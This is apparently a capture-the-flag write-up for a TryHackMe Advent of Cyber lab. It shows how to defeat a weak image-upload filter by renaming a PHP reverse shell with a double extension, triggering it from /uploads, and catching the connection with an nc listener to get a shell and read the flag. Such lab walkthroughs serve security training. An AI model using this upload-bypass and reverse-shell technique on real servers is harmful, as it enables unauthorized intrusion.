
to sign in visit:`?id=ODIzODI5MTNiYmYw`

from src code
```html
			<input type=file id="chooseFile" accept=".jpeg,.jpg,.png">
```
I then uploaded some picture, sadly it doesn't show where the images is save. I tried to us gobuster but the browser always return the main page even tho the requested page doesn't exits. I then need to try one by one, luckily I hit the correct directory at the first try `/uploads`


prepare 2 reverse shell, you can find php reverse shell by running `find / -name php-reverse* 2> /dev/null`. I changed the name and make it more cute :P. We know that the site only accept `.jpeg,.jpg,.png` by studying the src page. 


now let change the name of the file and include .png our reverse shell. since this page is poorly implemented, this should be enough to by pass it. 
```console                                                         
┌──(kali㉿kali)-[~/THM/adventofcyber/2]
└─$ cp cutiecat.php cutiecat.png.php
```
Dont forget to change IP + Port in the script before upload it. Open `nc` and listen/wait for incoming reverse shell then visit `/upload/cutiecat.png.php` to execute our shell!!


Boom
```
 nc -nlvp 6969                                                                                  1 ⨯
listening on [any] 6969 ...
connect to [10.8.14.151] from (UNKNOWN) [10.10.122.94] 40866
Linux security-server 4.18.0-193.28.1.el8_2.x86_64 #1 SMP Thu Oct 22 00:20:22 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 17:32:13 up 20 min,  0 users,  load average: 0.00, 0.13, 0.45
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: cannot set terminal process group (818): Inappropriate ioctl for device
sh: no job control in this shell
sh-4.4$ 
```
let go grab the flag
```
sh-4.4$ cat flag.txt
cat flag.txt


==============================================================


You've reached the end of the Advent of Cyber, Day 2 -- hopefully you're enjoying yourself so far, and are learning lots! 
This is all from me, so I'm going to take the chance to thank the awesome @Vargnaar for his invaluable design lessons, without which the theming of the past two websites simply would not be the same. 


Have a flag -- you deserve it!
THM{MGU3Y2UyMGUwNj___________}


Good luck on your mission (and maybe I'll see y'all again on Christmas Eve)!
 --Muiri (@MuirlandOracle)


==============================================================
```
cya tomorrow, GL happy hacking!!